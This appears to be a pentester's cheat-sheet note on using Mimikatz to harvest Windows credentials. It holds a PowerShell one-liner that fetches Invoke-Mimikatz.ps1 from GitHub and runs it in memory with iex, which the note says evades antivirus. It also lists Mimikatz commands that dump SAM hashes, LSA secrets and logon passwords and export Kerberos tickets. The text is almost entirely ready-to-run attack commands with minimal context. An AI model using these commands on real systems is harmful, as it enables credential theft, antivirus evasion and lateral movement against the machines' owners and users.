<https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Gather/Invoke-Mimikatz.ps1>
<https://github.com/caday00/mimikatz2.1.1>


powershell.exe -c "wget -useb <https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Gather/Invoke-Mimikatz.ps1> | iex; Invoke-Mimikatz"


This will run in mimikatz in memory and also bypass antivirus. 


Kerberos: (Check also [Ticket Attacks with mimikatz](Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Active%20Directory%20Methdology/Attacks/Golden_silver%20ticket%20_%20lateral%20movement.md), and [Kerberoast](Kerberoast%5CKerberoast.md))
kerberos::list /export


========
This one is not obfuscated same way, but if you struggle to use sekurlsa::logonpasswords or just having issues in general, then try this one:
<https://github.com/caday00/mimikatz2.1.1>

Also in /opt/mimikatz2.1.1/

mimikatz64.exe "privilege::debug" "lsadump::sam" "exit"

privilege::debug
token::elevate
lsadump::lsa /patch
lsadump::sam
lsadump::secrets
sekurlsa::logonpasswords
sekurlsa::logonpasswords /full